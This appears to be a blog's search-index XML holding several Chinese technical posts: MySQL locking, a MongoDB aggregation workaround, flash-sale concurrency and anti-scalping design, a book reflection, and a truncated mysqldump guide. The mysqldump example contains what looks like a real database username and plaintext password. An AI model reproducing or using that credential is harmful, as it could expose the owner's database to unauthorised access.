<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[MySQL中的共享锁与排它锁]]></title>
      <url>%2F2017%2F03%2F10%2Fmysql%E4%B8%AD%E7%9A%84%E5%85%B1%E4%BA%AB%E9%94%81%E4%B8%8E%E6%8E%92%E5%AE%83%E9%94%81%2F</url>
      <content type="text"><![CDATA[记得原来面试不知道共享锁和排它锁被人鄙视了，顾单独放上一篇！行级锁分为共享锁和排他锁两种，本文将详细介绍共享锁及排他锁的概念、使用方式及注意事项等。 共享锁(Share Lock)共享锁又称读锁，是读取操作创建的锁。其他用户可以并发读取数据，但任何事务都不能对数据进行修改（获取数据上的排他锁），直到已释放所有共享锁。 如果事务T对数据A加上共享锁后，则其他事务只能对A再加共享锁，不能加排他锁。获准共享锁的事务只能读数据，不能修改数据。 用法SELECT … LOCK IN SHARE MODE; 在查询语句后面增加 LOCK IN SHARE MODE ，Mysql会对查询结果中的每行都加共享锁，当没有其他线程对查询结果集中的任何一行使用排他锁时，可以成功申请共享锁，否则会被阻塞。其他线程也可以读取使用了共享锁的表，而且这些线程读取的是同一个版本的数据。 排他锁（eXclusive Lock）共享锁又称写锁，如果事务T对数据A加上排他锁后，则其他事务不能再对A加任任何类型的封锁。获准排他锁的事务既能读数据，又能修改数据。 用法SELECT … FOR UPDATE; 在查询语句后面增加 FOR UPDATE ，Mysql会对查询结果中的每行都加排他锁，当没有其他线程对查询结果集中的任何一行使用排他锁时，可以成功申请排他锁，否则会被阻塞。 意向锁InnoDB还有两个表锁： 意向共享锁（IS）：表示事务准备给数据行加入共享锁，也就是说一个数据行加共享锁前必须先取得该表的IS锁 意向排他锁（IX）：类似上面，表示事务准备给数据行加入排他锁，说明事务在一个数据行加排他锁前必须先取得该表的IX锁。 意向锁是InnoDB自动加的，不需要用户干预。对于insert、update、delete，InnoDB会自动给涉及的数据加排他锁（X）；对于一般的Select语句，InnoDB不会加任何锁，事务可以通过以下语句给显示加共享锁或排他锁。 共享锁： SELECT ... LOCK IN SHARE MODE; 排他锁： SELECT ... FOR UPDATE; 注意事项行级锁与表级锁行级锁都是基于索引的，如果一条SQL语句用不到索引是不会使用行级锁的，会使用表级锁。行级锁的缺点是：由于需要请求大量的锁资源，所以速度慢，内存消耗大。 行级锁与死锁MyISAM中是不会产生死锁的，因为MyISAM总是一次性获得所需的全部锁，要么全部满足，要么全部等待。而在InnoDB中，锁是逐步获得的，就造成了死锁的可能。 在MySQL中，行级锁并不是直接锁记录，而是锁索引。索引分为主键索引和非主键索引两种，如果一条sql语句操作了主键索引，MySQL就会锁定这条主键索引；如果一条语句操作了非主键索引，MySQL会先锁定该非主键索引，再锁定相关的主键索引。 在UPDATE、DELETE操作时，MySQL不仅锁定WHERE条件扫描过的所有索引记录，而且会锁定相邻的键值，即所谓的next-key locking。 当两个事务同时执行，一个锁住了逐渐索引在等待其他相关索引，一个锁定了非主键索引，在等待主键索引。这样就会发生死锁。 发生死锁后，InnoDB一般都可以检测到，并使一个事务释放锁回退，另一个获取锁完成事务。 有多种方法可以避免死锁，这里只介绍常见的三种1、如果不同程序会并发存取多个表，尽量约定以相同的顺序访问表，可以大大降低死锁机会。 2、在同一个事务中，尽可能做到一次锁定所需要的所有资源，减少死锁产生概率； 3、对于非常容易产生死锁的业务部分，可以尝试使用升级锁定颗粒度，通过表级锁定来减少死锁产生的概率；]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[aggregation result exceeds maximum document size (16MB)]]></title>
      <url>%2F2017%2F03%2F10%2Faggregation-result-exceeds-maximum-document-size-16mb%2F</url>
      <content type="text"><![CDATA[mongdb操作数据，数据格式如下，大概三百多条： &gt; db.dcclog20170228.find().pretty().limit(1){ “_id” : ObjectId(“58b7c5560717180be2ff0314”), “time” : 1488211200, “hour” : “00”, “ip” : “2947333517”, “cookieid” : “a74f75dac519271585c2e9bcf16f31ab”, “page” : “2bdb399e28604845ca1a2db96e066809”, “dcac” : 163, “dcv_0” : 9, “dcv_1” : 5, “dcv” : “9.5”, “dcvt” : [ “1479222012”, “1488211162”, “1488211162”, “1488211162”, “1488211203”, “110” ], “dctp” : 1, “dcrf” : “m.baidu.com/from=844b/bd_page_type=1/ssid=0/uid=0/pu=sz%401320_2001%2Cta%40iphone_1_8.0_3_600%2Cusm%401/baiduid=262B871AB239F6D1108F0EC5971B6678/w=010/t=iphone/l=1/tc?ref=www_iphone&amp;lid=14455673909231382786&amp;order=1&amp;fm=alop&amp;waplogo=1&amp;tj=www_normal_1_0_10_title&amp;vit=osres&amp;waput=1&amp;cltj=normaltitle&amp;asres=1&amp;nt=wnor&amp;title=%E5%9B%BE%E4%BA%8C%E6%89%8B%E9%A9%AC%E8%87%AA%E8%BE%BE3%E4%B8%A4%E5%8E%A2%E9%A9%AC%E8%87%AA%E8%BE%BE3%E4%B8%A4%E5%8E%A2%E4%BA%8C%E6%89%8B…_%E6%98%93%E8%BD%A6%E4%BA%8C%E6%89%8B%E8%BD%A6&amp;dict=-1&amp;w_qd=IlPT2AEptyoA_yk66ewbwge6BkdPlWgayEjCsPWUdxVw&amp;sec=19191&amp;di=1f88a683a4ebe1f1&amp;bdenc=1&amp;tch=124.1467.319.468.1.1132&amp;nsrc=IlPT2AEptyoA_yixCFOxXnANedT62v3IFw3UKydF0XSz96m7h44nJRhdXTqqAp73Gkf9xXiHhM9CbC8qQT2ek1EZebdmpK&amp;eqid=c89cded4bc9e70001000000358b44cce&amp;wd=&amp;clk_info=%7B%22srcid%22%3A%221599%22%2C%22tplname%22%3A%22www_normal%22%2C%22t%22%3A1488211160518%2C%22xpath%22%3A%22div-a-h3%22%7D”, “recomand_domain” : “5487”, “recomand_url” : 107835484, “dccv” : “null|1:page:mlist|1:prov:0|1:serial:2752|1:mbrand:18”, “provinceid” : 210000, “domain_id” : “2102”, “url_id” : 107977259} &nbsp; 需求时根据字段dccv拆分，但是数据量有300万条 语言使用PHP // 1、PV $ops_pv = [ [‘$match’ =&gt; [‘dccv’ =&gt; [‘$exists’ =&gt; true]]], [‘$group’ =&gt; [‘_id’ =&gt; [‘dcac’ =&gt; ‘$dcac’, ‘dccv’ =&gt; ‘$dccv’], ‘value’ =&gt; [‘$sum’ =&gt; 1]]], ]; $mongo-&gt;collection($collection_name)-&gt;aggregate($ops_pv, [‘allowDiskUse’ =&gt; true]);已经设置了将数据写到临时文件，但是出现报错信息： aggregation result exceeds maximum document size (16MB)超出了文档最大限制，顾先把数据临时输出到一个集合，只包含所需字段， // 1、PV $ops_pv = [ [‘$match’ =&gt; [‘dccv’ =&gt; [‘$exists’ =&gt; true]]], [‘$group’ =&gt; [‘_id’ =&gt; [‘dcac’ =&gt; ‘$dcac’, ‘dccv’ =&gt; ‘$dccv’], ‘value’ =&gt; [‘$sum’ =&gt; 1]]], [‘$out’=&gt;$tmp_name_pv], ]; $mongo-&gt;collection($collection_name)-&gt;aggregate($ops_pv, [‘allowDiskUse’ =&gt; true]); $cur = $mongo-&gt;collection($tmp_name_pv)-&gt;find(); while ($cur-&gt;hasNext()) { $v = $cur-&gt;getNext(); //page全部数据 $data_pv[implode(‘||’, $v[‘_id’])] = $v[‘value’]; }&lt;/pre&gt; &nbsp; 再从输出集合中逐条读取数据，减少内存消耗，程序正常运行。 基本思路就是化大为小，取整为零，数据是不变的 &nbsp; &nbsp;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Web系统大规模并发——秒杀与抢购]]></title>
      <url>%2F2017%2F03%2F06%2Fweb%E7%B3%BB%E7%BB%9F%E5%A4%A7%E8%A7%84%E6%A8%A1%E5%B9%B6%E5%8F%91-%E7%A7%92%E6%9D%80%E4%B8%8E%E6%8A%A2%E8%B4%AD%2F</url>
      <content type="text"><![CDATA[电商的秒杀和抢购，对我们来说，都不是一个陌生的东西。然而，从技术的角度来说，这对于Web系统是一个巨大的考验。当一个Web系统，在一秒钟内收到数以万计甚至更多请求时，系统的优化和稳定至关重要。这次我们会关注秒杀和抢购的技术实现和优化，同时，从技术层面揭开，为什么我们总是不容易抢到火车票的原因？ 一、大规模并发带来的挑战 在过去的工作中，我曾经面对过5w每秒的高并发秒杀功能，在这个过程中，整个Web系统遇到了很多的问题和挑战。如果Web系统不做针对性的优化，会轻而易举地陷入到异常状态。我们现在一起来讨论下，优化的思路和方法哈。 1. 请求接口的合理设计 一个秒杀或者抢购页面，通常分为2个部分，一个是静态的HTML等内容，另一个就是参与秒杀的Web后台请求接口。 通常静态HTML等内容，是通过CDN的部署，一般压力不大，核心瓶颈实际上在后台请求接口上。这个后端接口，必须能够支持高并发请求，同时，非常重要的一点，必须尽可能“快”，在最短的时间里返回用户的请求结果。为了实现尽可能快这一点，接口的后端存储使用内存级别的操作会更好一点。仍然直接面向MySQL之类的存储是不合适的，如果有这种复杂业务的需求，都建议采用异步写入。 当然，也有一些秒杀和抢购采用“滞后反馈”，就是说秒杀当下不知道结果，一段时间后才可以从页面中看到用户是否秒杀成功。但是，这种属于“偷懒”行为，同时给用户的体验也不好，容易被用户认为是“暗箱操作”。 2. 高并发的挑战：一定要“快” 我们通常衡量一个Web系统的吞吐率的指标是QPS（Query Per Second，每秒处理请求数），解决每秒数万次的高并发场景，这个指标非常关键。举个例子，我们假设处理一个业务请求平均响应时间为100ms，同时，系统内有20台Apache的Web服务器，配置MaxClients为500个（表示Apache的最大连接数目）。 那么，我们的Web系统的理论峰值QPS为（理想化的计算方式）： 20*500/0.1 = 100000 （10万QPS） 咦？我们的系统似乎很强大，1秒钟可以处理完10万的请求，5w/s的秒杀似乎是“纸老虎”哈。实际情况，当然没有这么理想。在高并发的实际场景下，机器都处于高负载的状态，在这个时候平均响应时间会被大大增加。 就Web服务器而言，Apache打开了越多的连接进程，CPU需要处理的上下文切换也越多，额外增加了CPU的消耗，然后就直接导致平均响应时间增加。因此上述的MaxClient数目，要根据CPU、内存等硬件因素综合考虑，绝对不是越多越好。可以通过Apache自带的abench来测试一下，取一个合适的值。然后，我们选择内存操作级别的存储的Redis，在高并发的状态下，存储的响应时间至关重要。网络带宽虽然也是一个因素，不过，这种请求数据包一般比较小，一般很少成为请求的瓶颈。负载均衡成为系统瓶颈的情况比较少，在这里不做讨论哈。 那么问题来了，假设我们的系统，在5w/s的高并发状态下，平均响应时间从100ms变为250ms（实际情况，甚至更多）： 20*500/0.25 = 40000 （4万QPS） 于是，我们的系统剩下了4w的QPS，面对5w每秒的请求，中间相差了1w。 然后，这才是真正的恶梦开始。举个例子，高速路口，1秒钟来5部车，每秒通过5部车，高速路口运作正常。突然，这个路口1秒钟只能通过4部车，车流量仍然依旧，结果必定出现大塞车。（5条车道忽然变成4条车道的感觉） 同理，某一个秒内，20*500个可用连接进程都在满负荷工作中，却仍然有1万个新来请求，没有连接进程可用，系统陷入到异常状态也是预期之内。 其实在正常的非高并发的业务场景中，也有类似的情况出现，某个业务请求接口出现问题，响应时间极慢，将整个Web请求响应时间拉得很长，逐渐将Web服务器的可用连接数占满，其他正常的业务请求，无连接进程可用。 更可怕的问题是，是用户的行为特点，系统越是不可用，用户的点击越频繁，恶性循环最终导致“雪崩”（其中一台Web机器挂了，导致流量分散到其他正常工作的机器上，再导致正常的机器也挂，然后恶性循环），将整个Web系统拖垮。 3. 重启与过载保护 如果系统发生“雪崩”，贸然重启服务，是无法解决问题的。最常见的现象是，启动起来后，立刻挂掉。这个时候，最好在入口层将流量拒绝，然后再将重启。如果是redis/memcache这种服务也挂了，重启的时候需要注意“预热”，并且很可能需要比较长的时间。 秒杀和抢购的场景，流量往往是超乎我们系统的准备和想象的。这个时候，过载保护是必要的。如果检测到系统满负载状态，拒绝请求也是一种保护措施。在前端设置过滤是最简单的方式，但是，这种做法是被用户“千夫所指”的行为。更合适一点的是，将过载保护设置在CGI入口层，快速将客户的直接请求返回。 二、作弊的手段：进攻与防守 秒杀和抢购收到了“海量”的请求，实际上里面的水分是很大的。不少用户，为了“抢“到商品，会使用“刷票工具”等类型的辅助工具，帮助他们发送尽可能多的请求到服务器。还有一部分高级用户，制作强大的自动请求脚本。这种做法的理由也很简单，就是在参与秒杀和抢购的请求中，自己的请求数目占比越多，成功的概率越高。 这些都是属于“作弊的手段”，不过，有“进攻”就有“防守”，这是一场没有硝烟的战斗哈。 1. 同一个账号，一次性发出多个请求 部分用户通过浏览器的插件或者其他工具，在秒杀开始的时间里，以自己的账号，一次发送上百甚至更多的请求。实际上，这样的用户破坏了秒杀和抢购的公平性。 这种请求在某些没有做数据安全处理的系统里，也可能造成另外一种破坏，导致某些判断条件被绕过。例如一个简单的领取逻辑，先判断用户是否有参与记录，如果没有则领取成功，最后写入到参与记录中。这是个非常简单的逻辑，但是，在高并发的场景下，存在深深的漏洞。多个并发请求通过负载均衡服务器，分配到内网的多台Web服务器，它们首先向存储发送查询请求，然后，在某个请求成功写入参与记录的时间差内，其他的请求获查询到的结果都是“没有参与记录”。这里，就存在逻辑判断被绕过的风险。 应对方案： 在程序入口处，一个账号只允许接受1个请求，其他请求过滤。不仅解决了同一个账号，发送N个请求的问题，还保证了后续的逻辑流程的安全。实现方案，可以通过Redis这种内存缓存服务，写入一个标志位（只允许1个请求写成功，结合watch的乐观锁的特性），成功写入的则可以继续参加。 或者，自己实现一个服务，将同一个账号的请求放入一个队列中，处理完一个，再处理下一个。 2. 多个账号，一次性发送多个请求 很多公司的账号注册功能，在发展早期几乎是没有限制的，很容易就可以注册很多个账号。因此，也导致了出现了一些特殊的工作室，通过编写自动注册脚本，积累了一大批“僵尸账号”，数量庞大，几万甚至几十万的账号不等，专门做各种刷的行为（这就是微博中的“僵尸粉“的来源）。举个例子，例如微博中有转发抽奖的活动，如果我们使用几万个“僵尸号”去混进去转发，这样就可以大大提升我们中奖的概率。 这种账号，使用在秒杀和抢购里，也是同一个道理。例如，iPhone官网的抢购，火车票黄牛党。 应对方案： 这种场景，可以通过检测指定机器IP请求频率就可以解决，如果发现某个IP请求频率很高，可以给它弹出一个验证码或者直接禁止它的请求： 弹出验证码，最核心的追求，就是分辨出真实用户。因此，大家可能经常发现，网站弹出的验证码，有些是“鬼神乱舞”的样子，有时让我们根本无法看清。他们这样做的原因，其实也是为了让验证码的图片不被轻易识别，因为强大的“自动脚本”可以通过图片识别里面的字符，然后让脚本自动填写验证码。实际上，有一些非常创新的验证码，效果会比较好，例如给你一个简单问题让你回答，或者让你完成某些简单操作（例如百度贴吧的验证码）。 直接禁止IP，实际上是有些粗暴的，因为有些真实用户的网络场景恰好是同一出口IP的，可能会有“误伤“。但是这一个做法简单高效，根据实际场景使用可以获得很好的效果。3. 多个账号，不同IP发送不同请求 所谓道高一尺，魔高一丈。有进攻，就会有防守，永不休止。这些“工作室”，发现你对单机IP请求频率有控制之后，他们也针对这种场景，想出了他们的“新进攻方案”，就是不断改变IP。 有同学会好奇，这些随机IP服务怎么来的。有一些是某些机构自己占据一批独立IP，然后做成一个随机代理IP的服务，有偿提供给这些“工作室”使用。还有一些更为黑暗一点的，就是通过木马黑掉普通用户的电脑，这个木马也不破坏用户电脑的正常运作，只做一件事情，就是转发IP包，普通用户的电脑被变成了IP代理出口。通过这种做法，黑客就拿到了大量的独立IP，然后搭建为随机IP服务，就是为了挣钱。 应对方案： 说实话，这种场景下的请求，和真实用户的行为，已经基本相同了，想做分辨很困难。再做进一步的限制很容易“误伤“真实用户，这个时候，通常只能通过设置业务门槛高来限制这种请求了，或者通过账号行为的”数据挖掘“来提前清理掉它们。 僵尸账号也还是有一些共同特征的，例如账号很可能属于同一个号码段甚至是连号的，活跃度不高，等级低，资料不全等等。根据这些特点，适当设置参与门槛，例如限制参与秒杀的账号等级。通过这些业务手段，也是可以过滤掉一些僵尸号。 4. 火车票的抢购 看到这里，同学们是否明白你为什么抢不到火车票？如果你只是老老实实地去抢票，真的很难。通过多账号的方式，火车票的黄牛将很多车票的名额占据，部分强大的黄牛，在处理验证码方面，更是“技高一筹“。 高级的黄牛刷票时，在识别验证码的时候使用真实的人，中间搭建一个展示验证码图片的中转软件服务，真人浏览图片并填写下真实验证码，返回给中转软件。对于这种方式，验证码的保护限制作用被废除了，目前也没有很好的解决方案。 因为火车票是根据身份证实名制的，这里还有一个火车票的转让操作方式。大致的操作方式，是先用买家的身份证开启一个抢票工具，持续发送请求，黄牛账号选择退票，然后黄牛买家成功通过自己的身份证购票成功。当一列车厢没有票了的时候，是没有很多人盯着看的，况且黄牛们的抢票工具也很强大，即使让我们看见有退票，我们也不一定能抢得过他们哈。 最终，黄牛顺利将火车票转移到买家的身份证下。 解决方案： 并没有很好的解决方案，唯一可以动心思的也许是对账号数据进行“数据挖掘”，这些黄牛账号也是有一些共同特征的，例如经常抢票和退票，节假日异常活跃等等。将它们分析出来，再做进一步处理和甄别。 三、高并发下的数据安全 我们知道在多线程写入同一个文件的时候，会存现“线程安全”的问题（多个线程同时运行同一段代码，如果每次运行结果和单线程运行的结果是一样的，结果和预期相同，就是线程安全的）。如果是MySQL数据库，可以使用它自带的锁机制很好的解决问题，但是，在大规模并发的场景中，是不推荐使用MySQL的。秒杀和抢购的场景中，还有另外一个问题，就是“超发”，如果在这方面控制不慎，会产生发送过多的情况。我们也曾经听说过，某些电商搞抢购活动，买家成功拍下后，商家却不承认订单有效，拒绝发货。这里的问题，也许并不一定是商家奸诈，而是系统技术层面存在超发风险导致的。 1. 超发的原因 假设某个抢购场景中，我们一共只有100个商品，在最后一刻，我们已经消耗了99个商品，仅剩最后一个。这个时候，系统发来多个并发请求，这批请求读取到的商品余量都是99个，然后都通过了这一个余量判断，最终导致超发。（同文章前面说的场景） 在上面的这个图中，就导致了并发用户B也“抢购成功”，多让一个人获得了商品。这种场景，在高并发的情况下非常容易出现。 2. 悲观锁思路 解决线程安全的思路很多，可以从“悲观锁”的方向开始讨论。 悲观锁，也就是在修改数据的时候，采用锁定状态，排斥外部请求的修改。遇到加锁的状态，就必须等待。 虽然上述的方案的确解决了线程安全的问题，但是，别忘记，我们的场景是“高并发”。也就是说，会很多这样的修改请求，每个请求都需要等待“锁”，某些线程可能永远都没有机会抢到这个“锁”，这种请求就会死在那里。同时，这种请求会很多，瞬间增大系统的平均响应时间，结果是可用连接数被耗尽，系统陷入异常。 3. FIFO队列思路 那好，那么我们稍微修改一下上面的场景，我们直接将请求放入队列中的，采用FIFO（First Input First Output，先进先出），这样的话，我们就不会导致某些请求永远获取不到锁。看到这里，是不是有点强行将多线程变成单线程的感觉哈。 然后，我们现在解决了锁的问题，全部请求采用“先进先出”的队列方式来处理。那么新的问题来了，高并发的场景下，因为请求很多，很可能一瞬间将队列内存“撑爆”，然后系统又陷入到了异常状态。或者设计一个极大的内存队列，也是一种方案，但是，系统处理完一个队列内请求的速度根本无法和疯狂涌入队列中的数目相比。也就是说，队列内的请求会越积累越多，最终Web系统平均响应时候还是会大幅下降，系统还是陷入异常。 4. 乐观锁思路 这个时候，我们就可以讨论一下“乐观锁”的思路了。乐观锁，是相对于“悲观锁”采用更为宽松的加锁机制，大都是采用带版本号（Version）更新。实现就是，这个数据所有请求都有资格去修改，但会获得一个该数据的版本号，只有版本号符合的才能更新成功，其他的返回抢购失败。这样的话，我们就不需要考虑队列的问题，不过，它会增大CPU的计算开销。但是，综合来说，这是一个比较好的解决方案。 有很多软件和服务都“乐观锁”功能的支持，例如Redis中的watch就是其中之一。通过这个实现，我们保证了数据的安全。 四、小结 互联网正在高速发展，使用互联网服务的用户越多，高并发的场景也变得越来越多。电商秒杀和抢购，是两个比较典型的互联网高并发场景。虽然我们解决问题的具体技术方案可能千差万别，但是遇到的挑战却是相似的，因此解决问题的思路也异曲同工。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[不是书评 ：《我是一只IT小小鸟》]]></title>
      <url>%2F2017%2F02%2F27%2F%E4%B8%8D%E6%98%AF%E4%B9%A6%E8%AF%84-%EF%BC%9A%E3%80%8A%E6%88%91%E6%98%AF%E4%B8%80%E5%8F%AAit%E5%B0%8F%E5%B0%8F%E9%B8%9F%E3%80%8B%2F</url>
      <content type="text"><![CDATA[设计你自己的进度条 进度条的设计是一个很多人都知道的故事：同样的耗时，如果不给任何进度提示，只是在完成之后才弹出一个完成消息，中间没有任何动态变化，那么整个过程就会让人等得非常焦急，导致一些人干脆把程序关了了事。如果有进度不断更新，那么对整个过程耗时的心理感受就会远低于实际值，用户也不会郁闷到把程序关了。（你有多少次在银行处理手续的时候，看着工作人员把一堆材料不停地倒腾来去，心里多希望他们可以在柜台小窗口上投影一个进度条？） 这里的原因在于，没有进度提示的话，我们无法判断这个等待什么时候才是个尽头。如果有不断增长的进度条，那么我们对于什么时候会达到100%就会有一个粗略的估计，这个估计是一剂定心丸，让我们知道这事情总会并且会在不久的将来完成。 做事情也是同样的道理，善于规划的人，会将目标分割成一个个的里程碑，再将里程碑分割成TODO列表。前阵子流行的GTD方法学，核心的理念就在于，如果你把任务分割了，你就有了进度条，你就知道，事情在不断的进展，你总会完成任务或到达你的目标，你会有一个时间估计。反之如果没有这个分割，整个的任务或目标对你来说就只有两种状态——“完成”和“未完成”，如果不幸是一个比较漫长的目标，那么你会发现你的进度条总是“未完成”，一次又一次的等待未果会耗尽你的耐心，让你下意识的产生“这事什么时候才能完呢？”的疑惑，没有分而治之，你就不知道未来还需要付出多少努力才能达到目的，这就会让你心生怯意，不敢进一步投入时间，免得血本无归。在这样的心理下，不少人就会选择保守策略——退出，以免到头来花了时间还一事无成。 而所谓的规划其实就是针对这种心理弱点的做事方法。如果你对整个目标的几个重大步骤有清晰的界定，能够对每个步骤的耗时作出靠谱的上界估计，你就不会被不确定的未来，不确定的时间投入感到恐惧，就不会被这种不确定感压迫到过早退出。 不要过早退出循环 我们在尝试新的事物的时候，总是会遇到各种各样的困难，不同的人会在碰壁不同的次数之后退出。用程序员喜欢的话来说就是，我们都在for循环，区别在于你是什么情况下break;的。有的人退出阈值高，这是能坚持的一类人，有的人退出阈值低，这类人很可能遇到一些障碍就退出了。 过早退出的原因往往在于对于未来的不确定性，对于投资时间最终无法收到回报的恐惧，感受到的困难越大，这种恐惧越大，因为越大的困难往往暗示着这个任务需要投资的时间越大。所以其实我们都是直觉经济学家，当我们说“畏难”的时候，其实我们畏惧的不是困难本身，而是困难所暗示的时间经济学意义。 然而，我们的情绪大脑毕竟比较原始，仅根据碰壁的次数或硬度来判断事情的难易并不一定靠谱，如果你遇到困难，不妨用一用互联网，用一用群体的智慧，看看别人当时是怎么想怎么办的，绝大多数情况下你并不孤单，你遇到的问题早就有人遇到过，你踩过的坑里面尽是前人的脚印，不要仅仅因为一时摸不着头绪，找不着出路就退出，这不是informed decision，问一问自己作出退出的决策是否基于足够的信息，我是否进行了足够的调查，至少，是否去简单用了用搜索引擎。 模仿高德纳先生的名言：过早退出是一切失败的根源。 兴趣遍地都是，专注和持之以恒才是真正稀缺的。 很多人看了书中的故事之后得出这样的结论：兴趣最重要。然而，我觉得区别他们和其他人的，并不是他们拥有超过常人的兴趣，而是他们拥有超过常人的毅力。 其实人天生就对新事物怀有好奇心，难以找出谁没有对任何事物或领域产生过兴趣，然而不同的是，有些人的兴趣只能持续几天，当遇到第一个困难，第一道坎的时候，他们就熄灭了，然而另一些人的兴趣火花会变成火苗，火苗会变成火种，一直稳定的燃烧很多年。区别他们的并不是兴趣的有无，而是他们的性格里面有没有维持兴趣的火种一直燃烧下去的燃料。 一个人有专注和持之以恒的性格，即便在一个没有多大兴趣的领域也能成为专家（更何况，兴趣的很大一类来源就是“我擅长做这件事情”）；反之就算有兴趣也很快会被一些冷水泼灭。 生活中的选择远比我们想象得要多，细微的选择差异造就了不同的人生 唐雅薇同学的故事中，有这么一个细节吸引了我的注意：当时她正在找工作阶段，对女生在IT行业的发展很迷茫，恰逢微软的郭蓓菁女士到他们学校演讲，演讲完了之后她立即就奔上讲台拦住郭女士询问女生与IT的问题。 这是一个细节，但我相信不是所有人都有勇气上去拦住名人问普通问题的，我们会给自己找很多很多的理由和接口，我想最常见的应该是两个原因：1. 如果被批评了自尊心会受到打击。2.认为问了也问不出特别的信息。然而事实却是相反：1. 自尊心受到打击算不上实质性的损失。2. 你想不出能问出什么特别的信息并不代表就真的问不到重要的信息。别把不知道当成没有。 一个小小的思维差异，可能导致很多人在遇到困惑的时候原地打转，冲突不出，而另一些人则取经得到宝贵的经验，站在别人的肩膀上越过了障碍。唐雅薇从郭女士那儿得到了最宝贵的信息：女生在IT行业也能有很好的发展。信心，是这样一种奇怪的东西，就算你没有确切的证明未来会更好，你也会坚持下去，你不会过早退出循环；而来源于过来人的信息则是信心最靠谱的保障。 你是不是意识到，在平常的生活中，你所作出的选择比你想象的要多得多呢？有没有想过有一些看似细小的选择可能会产生巨大的影响？ 想想看，试一下，是不是真的没什么损失，还有可能得到巨大的回报呢？ 靠专业技能的成功是最具可复制性的 它需要的只是你在一个领域坚持不懈地专注下去，只需要选择一个不算太不靠谱的方向，然后专心致志的专下去，最后必然能成为高手或者绝顶高手。世上有很多成功带有偶然因素和运气成分或出身环境，但至少这一样，被无数人复制了无数遍，否则就不会存在学校和教育了。 反思是让人得以改进自己的最重要的思维品质 很多人在成年之后甚至未及成年，性格就难以再发生大的变化。性格是这样一种自我实现和强化的陷阱：如果你是不容易专注的人，你会发现生活中处处都是分散你注意力的东西，你的思维难以在一个事情上停留半小时，于是你的时间变得琐碎，你很难在一个领域有长久的积累和深入的思考，这样的现实可能会让你感到沮丧，后者让你更加无法专心，这样的现实可能会让你感到焦虑，为了避开焦虑你又会去寻求其他的刺激，结果是恶性循环。 反思是改变自己的第一步，我们常常容易发现别人的问题，别人的错误，却难以发现自己思维中的问题，因为我们很少会把自己的思维当成目标去思考。 作为程序员，相信没有人不知道能修改自身的程序，而能修改自身的程序的前提就是，首先这个程序必须有法子能够指向自身。 饿死在干草堆之间的驴子 有很多在迷茫期的同学，迷茫都是相似的：面前有两条路，到底选哪一条？“转行还是不转行？”“学C++还是学Java。？“做管理还是做程序员？”有些问题其实不是问题：比如“学C++还是学Java。”答案是都学而且还不仅学两个。有些问题不是一个泛泛的答案能够适合的，比如转行还是不转行，需要考虑很多自身因素。 但更重要的是，有人会因为无法作出决定就推迟决定，然而实际上推迟决定是最差的决定，在推迟决定期间，时间悄悄流逝，你却没有任何一条路上的积累，白白浪费了时间。 如果你有一些钱不知道花在A还是B上，你先不作决定，没问题，因为钱还是你的，但如果你有一些时间，不知道花在A上还是B上，不行，因为过了这段时间，这段时间就不是你的了。 所以，不管有多纠结，也不要从纠结中逃离，试图推延决定，既然终究是个痛苦的决定，就痛一回，好好思考和调查之后作出一个决定并坚持下去，只要不是太不靠谱的行业（相信也没谁会在纠结了之后却选了一个不靠谱的行业的），经过你的积累总会成为高手。 一生的知识积累，自学的起码占**90%** 你会在这本书当中看到的一个重复出现的现象就是自学，大规模的自学，逃课自学，上网找书自学，程序员行业是最适合自学的行业，网络是程序员的天堂，需要的资源、工具，比课堂上的多出何止百倍，如果说还有一个学科，并不需要传统的教育就可以成才，估计非程序员莫属了。作为程序员如果没有查过wikipedia，没有看过几本原版电子书，没有在国内外主要邮件列表里面提过问题吵过架，没有用技术博客记录学习的独特体会，没有订阅技术牛人们的博客，怎么好意思说身在这个行业呢？ 最后，看完了书还是说“说起来容易做起来难”的，怪自己，不怪书。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[mysql导入导出详解]]></title>
      <url>%2F2017%2F02%2F24%2Fmysql%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E8%AF%A6%E8%A7%A3%2F</url>
      <content type="text"><![CDATA[有时数据由于业务和历史数据原因，可能做优化调整，例如分表分库，百万级别的数据mysql还是可以应付的，但是有些业务可能是按天增长的，比如网站报告等等，每天的数据总量都会按一定的规律增长，数据量可能会达到千万级别甚至过亿，这时如果拆分使用insert select操作会导致当前表处于锁状态，会影响业务。 一、mysql导出有俩种方式： 1、mysqldump命令 /usr/local/mysql/product/bin/mysqldump -u tracking_createtable -p Pmw99AU -t auto_tracking auto_url -w “id&lt;125806272 and web_id=163” &gt;/data/auto_url_163.sql具体参数详解如下 · –add-drop–database 在每个CREATE DATABASE语句前添加DROP DATABASE语句。 · –add-drop-tables 在每个CREATE TABLE语句前添加DROP TABLE语句。 · –add-locking 用LOCK TABLES和UNLOCK TABLES语句引用每个表转储。重载转储文件时插入得更快。 · –all–database，-A 转储所有数据库中的所有表。与使用—database选项相同，在命令行中命名所有数据库。 · –allow-keywords 允许创建关键字列名。应在每个列名前面加上表名前缀。 · —comments[={0|1}] 如果设置为 0，禁止转储文件中的其它信息，例如程序版本、服务器版本和主机。–skip—comments与—comments=0的结果相同。 默认值为1，即包括额外信息。 · –compact 产生少量输出。该选项禁用注释并启用–skip-add-drop-tables、–no-set-names、–skip-disable-keys和–skip-add-locking选项。 · –compatible=name 产生与其它数据库系统或旧的MySQL服务器更兼容的输出。值可以为ansi、mysql323、mysql40、postgresql、oracle、mssql、db2、maxdb、no_key_options、no_tables_options或者no_field_options。要使用几个值，用逗号将它们隔开。这些值与设置服务器SQL模式的相应选项有相同的含义。 该选项不能保证同其它服务器之间的兼容性。它只启用那些目前能够使转储输出更兼容的SQL模式值。例如，–compatible=oracle 不映射Oracle类型或使用Oracle注释语法的数据类型。 · –complete-insert，-c 使用包括列名的完整的INSERT语句。 · –compress，-C 压缩在客户端和服务器之间发送的所有信息（如果二者均支持压缩）。 · –create-option 在CREATE TABLE语句中包括所有MySQL表选项。 · —database，-B 转储几个数据库。通常情况，mysqldump将命令行中的第1个名字参量看作数据库名，后面的名看作表名。使用该选项，它将所有名字参量看作数据库名。CREATE DATABASE IF NOT EXISTS db_name和USE db_name语句包含在每个新数据库前的输出中。 · —debug[=debug_options]，-# [debug_options] 写调试日志。debug_options字符串通常为’d:t:o,file_name’。 · –default-character-set=charset 